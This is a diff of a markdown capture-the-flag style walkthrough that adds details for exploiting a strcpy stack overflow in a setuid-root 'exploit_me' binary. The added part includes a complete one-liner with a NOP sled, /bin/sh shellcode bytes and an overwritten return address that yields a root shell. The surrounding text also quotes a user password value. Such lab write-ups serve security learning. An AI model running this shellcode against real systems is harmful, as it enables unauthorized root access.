@@ -109,9 +109,14 @@ When we md5 it we get the password for zaz user: `646da671ca01bb5d84dbb5fb2238dc
 
 ## Overflow binary
 
-In zaz repo there is a binary that is vulnerable to a stack overflow 
-We can inject a shellcode in it which will get executed with a proper padding
+In zaz repo there is a binary that is vulnerable to a stack overflow, through a call to strcpy.
+The binary take one argument, that's where we place our shellcode. We try to find the address of
+strcpy dest (approximately 0xbffff660) to replace the main return address. We add a nop slide before
+the shellcode, so we have more odds to get to it:
+
+./exploit_me $(python -c "print '\x90' * 32 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x60\xf6\xff\xbf' * 21")
+
 Since the vulnerable binary is setuid with root right the shell we get from the shellcode is as root
 
-We can verify with a `whoami` inside and we have our interactive shell as root on the machine
+We can verify with a `whoami` inside and have our interactive shell as root on the machine
 Hooray!!
